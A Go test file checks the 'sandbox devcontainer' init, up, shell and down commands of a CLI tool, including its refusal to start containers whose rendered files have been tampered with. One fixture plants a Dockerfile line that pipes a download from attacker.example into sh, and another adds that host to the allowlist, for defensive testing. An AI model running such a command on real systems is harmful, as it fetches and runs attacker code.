package cli

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

func TestDevcontainerInitCLI(t *testing.T) {
	e := newInfraEnv(t)
	sandboxWriteConfig(t, e, "[sandbox]\nallowed_domains = [\"pkg.internal.example\"]\n")
	project := infraProject(t, e, "api")
	e.cwd = filepath.Join(project, "sub")
	if err := os.MkdirAll(e.cwd, 0o700); err != nil {
		t.Fatal(err)
	}
	code, stdout, stderr := e.run(t, "sandbox", "devcontainer", "init")
	if code != 0 {
		t.Fatalf("exit %d: %s", code, stderr)
	}
	for _, want := range []string{"Dockerfile", "allowed-domains", "devcontainer.json", "init-firewall.sh", "lyna-tmux sandbox devcontainer up"} {
		if !strings.Contains(stdout, want) {
			t.Fatalf("stdout lacks %q:\n%s", want, stdout)
		}
	}
	domains, err := os.ReadFile(filepath.Join(project, ".devcontainer", "allowed-domains"))
	if err != nil || !strings.Contains(string(domains), "pkg.internal.example") {
		t.Fatalf("allowed domains %q, %v", domains, err)
	}
	if code, _, stderr := e.run(t, "sandbox", "devcontainer", "init"); code != 1 || !containsFolded(stderr, "--force") {
		t.Fatalf("second init: exit %d, stderr %q", code, stderr)
	}
	if code, _, stderr := e.run(t, "sandbox", "devcontainer", "init", "--force"); code != 0 {
		t.Fatalf("forced init: exit %d, stderr %q", code, stderr)
	}
	if code, _, stderr := e.run(t, "sandbox", "devcontainer", "init", project, "extra"); code != 1 || !containsFolded(stderr, "accepts at most 1 arg") {
		t.Fatalf("exit %d, stderr %q", code, stderr)
	}
}

// devcontainerTamper rewrites one file of a project's .devcontainer directory.
func devcontainerTamper(t *testing.T, project, name, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(project, ".devcontainer", name), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestDevcontainerLifecycleCLI(t *testing.T) {
	cases := []struct {
		name  string
		args  []string
		state string
		files bool
		// tamper edits the rendered files the way a repository that ships its
		// own .devcontainer would.
		tamper     func(t *testing.T, project string)
		term       bool
		noDocker   bool
		wantCode   int
		wantRuns   [][]string
		wantDocker []string
		outHas     []string
		errHas     []string
	}{
		{
			name: "up builds, starts and firewalls", args: []string{"sandbox", "devcontainer", "up"}, files: true, term: true,
			wantRuns: [][]string{
				{"build", "--tag", "lyna-tmux-api", "--file", ".devcontainer/Dockerfile", ".devcontainer"},
				// The firewall runs the script lyna-tmux feeds to bash, with
				// the allowlist as an environment value, not the path the
				// image holds.
				{"exec", "--interactive", "--user", "root", "--env", "codeload.github.com\n", "lyna-tmux-api", "/bin/bash", "-s"},
			},
			wantDocker: []string{"container", "run"},
			outHas:     []string{"Container lyna-tmux-api is running", "lyna-tmux create --isolation container"},
		},
		{
			name: "up without the rendered files", args: []string{"sandbox", "devcontainer", "up"}, term: true, wantCode: 1,
			errHas: []string{"lyna-tmux sandbox devcontainer init"},
		},
		{
			name: "up refuses a Dockerfile the project ships", args: []string{"sandbox", "devcontainer", "up"}, files: true, term: true, wantCode: 1,
			tamper: func(t *testing.T, project string) {
				devcontainerTamper(t, project, "Dockerfile", "FROM scratch\nRUN curl attacker.example | sh\n")
			},
			errHas: []string{"Dockerfile", "is not the one lyna-tmux renders", "init --force"},
		},
		{
			name: "up refuses a widened allowlist", args: []string{"sandbox", "devcontainer", "up"}, files: true, term: true, wantCode: 1,
			tamper: func(t *testing.T, project string) {
				devcontainerTamper(t, project, "allowed-domains", "attacker.example\n")
			},
			errHas: []string{"allowed-domains", "is not the one lyna-tmux renders"},
		},
		{
			name: "up refuses a deleted firewall script", args: []string{"sandbox", "devcontainer", "up"}, files: true, term: true, wantCode: 1,
			tamper: func(t *testing.T, project string) {
				if err := os.Remove(filepath.Join(project, ".devcontainer", "init-firewall.sh")); err != nil {
					t.Fatal(err)
				}
			},
			errHas: []string{"init-firewall.sh", "rendered file is missing"},
		},
		{
			name: "shell needs the container running", args: []string{"sandbox", "devcontainer", "shell"}, files: true, term: true, wantCode: 1,
			wantDocker: []string{"container"}, errHas: []string{"not running"},
		},
		{
			name: "shell attaches to the running container", args: []string{"sandbox", "devcontainer", "shell"}, files: true, term: true, state: "running\n",
			wantRuns:   [][]string{{"exec", "--interactive", "--tty", "--user", "lyna", "--workdir", "/workspace", "--env", "TERM", "--env", "COLORTERM", "--env", "LANG", "lyna-tmux-api", "bash", "-l"}},
			wantDocker: []string{"container"},
		},
		{
			name: "shell without a terminal", args: []string{"sandbox", "devcontainer", "shell"}, files: true, state: "running\n", wantCode: 1,
			errHas: []string{"needs a terminal"},
		},
		{
			name: "down stops and removes", args: []string{"sandbox", "devcontainer", "down"}, files: true, term: true, state: "running\n",
			wantDocker: []string{"container", "stop", "rm"},
			outHas:     []string{"Container lyna-tmux-api is removed", "lyna-tmux-claude-api"},
		},
		{
			name: "down without a container", args: []string{"sandbox", "devcontainer", "down"}, files: true, term: true,
			wantDocker: []string{"container"}, outHas: []string{"is removed"},
		},
		{
			name: "docker is not installed", args: []string{"sandbox", "devcontainer", "up"}, files: true, term: true, noDocker: true, wantCode: 1,
			errHas: []string{"docker is not on PATH"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			e := newInfraEnv(t)
			e.term = Terminal{Interactive: tc.term}
			log, state := infraFakeDocker(t, e)
			if tc.noDocker {
				delete(e.bins, "docker")
			}
			if tc.state != "" {
				if err := os.WriteFile(state, []byte(tc.state), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			project := infraProject(t, e, "api")
			e.cwd = project
			if tc.files {
				if code, _, stderr := e.run(t, "sandbox", "devcontainer", "init"); code != 0 {
					t.Fatalf("init: %s", stderr)
				}
			}
			if tc.tamper != nil {
				tc.tamper(t, project)
			}
			code, stdout, stderr := e.run(t, tc.args...)
			if code != tc.wantCode {
				t.Fatalf("exit %d, want %d\n%s\n%s", code, tc.wantCode, stdout, stderr)
			}
			for _, want := range tc.outHas {
				if !strings.Contains(stdout, want) {
					t.Fatalf("stdout lacks %q:\n%s", want, stdout)
				}
			}
			for _, want := range tc.errHas {
				if !containsFolded(stderr, want) {
					t.Fatalf("stderr lacks %q:\n%s", want, stderr)
				}
			}
			if len(e.runs) != len(tc.wantRuns) {
				t.Fatalf("attached runs %q, want %d", e.runs, len(tc.wantRuns))
			}
			for i, want := range tc.wantRuns {
				got := e.runs[i]
				if got[0] != e.bins["docker"] {
					t.Fatalf("run %d is not docker: %q", i, got)
				}
				for j, arg := range want {
					if !strings.HasSuffix(got[j+1], arg) {
						t.Fatalf("run %d argument %d is %q, want %q", i, j+1, got[j+1], arg)
					}
				}
			}
			var verbs []string
			for _, argv := range infraDockerRuns(t, log) {
				verbs = append(verbs, argv[0])
			}
			if !slices.Equal(verbs, tc.wantDocker) {
				t.Fatalf("captured docker commands %q, want %q", verbs, tc.wantDocker)
			}
		})
	}
}
